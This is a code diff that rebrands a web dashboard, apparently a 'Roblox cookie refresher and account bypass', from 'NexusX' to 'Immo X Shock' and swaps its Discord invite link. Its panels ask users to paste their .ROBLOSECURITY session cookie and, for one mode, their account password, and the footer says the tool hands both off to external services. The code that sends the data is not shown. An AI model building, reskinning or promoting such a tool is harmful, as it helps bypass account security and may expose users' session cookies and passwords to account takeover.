@@ -6,16 +6,16 @@ import { refreshCookie, bypassAccount } from "@/lib/nexusx.functions";
 export const Route = createFileRoute("/")({
   head: () => ({
     meta: [
-      { title: "NexusX — Refresher & Bypass" },
+      { title: "Immo X Shock — Refresher & Bypass" },
       {
         name: "description",
-        content: "NexusX: Roblox cookie refresher and account bypass in one dark, clean dashboard.",
+        content: "Immo X Shock: Roblox cookie refresher and account bypass in one dark, clean dashboard.",
       },
-      { property: "og:title", content: "NexusX" },
+      { property: "og:title", content: "Immo X Shock" },
       { property: "og:description", content: "Roblox cookie refresher & bypass." },
     ],
   }),
-  component: NexusX,
+  component: ImmoXShock,
 });
 
 function Bolt({ className = "" }: { className?: string }) {
@@ -40,7 +40,7 @@ function LogoBadge() {
   );
 }
 
-function NexusX() {
+function ImmoXShock() {
   return (
     <div className="nx-root min-h-screen text-nx-text">
       <header className="mx-auto flex max-w-6xl items-center justify-between px-6 pt-8">
@@ -56,7 +56,7 @@ function NexusX() {
           </div>
         </div>
         <a
-          href="https://discord.gg/HeM2ardrVg"
+          href="https://discord.gg/EuYdpMrNYz"
           target="_blank"
           rel="noopener noreferrer"
           className="group inline-flex items-center gap-2 rounded-xl bg-white px-5 py-2.5 font-semibold text-black shadow-[0_0_30px_rgba(255,255,255,0.25)] transition hover:bg-white/90"
@@ -74,7 +74,7 @@ function NexusX() {
       </main>
 
       <footer className="mx-auto max-w-6xl px-6 pb-10 text-center text-xs text-nx-text/50">
-        NexusX hands off to external services. Never share cookies with people you don't trust.
+        Immo X Shock hands off to external services. Never share cookies with people you don't trust.
       </footer>
     </div>
   );
@@ -172,7 +172,7 @@ function RefresherPanel() {
 
   return (
     <PanelShell
-      title="NexusX Refresher"
+      title="Immo X Shock Refresher"
       subtitle="Paste your .ROBLOSECURITY cookie to refresh it."
     >
       <Field label="COOKIE">
@@ -218,7 +218,7 @@ function BypasserPanel() {
 
   return (
     <PanelShell
-      title="NexusX Bypass"
+      title="Immo X Shock Bypass"
       subtitle="Account bypass via rblxbypasser. V2 also requires your account password."
     >
       <div className="mb-4 inline-flex rounded-xl border border-white/30 bg-black/60 p-1">
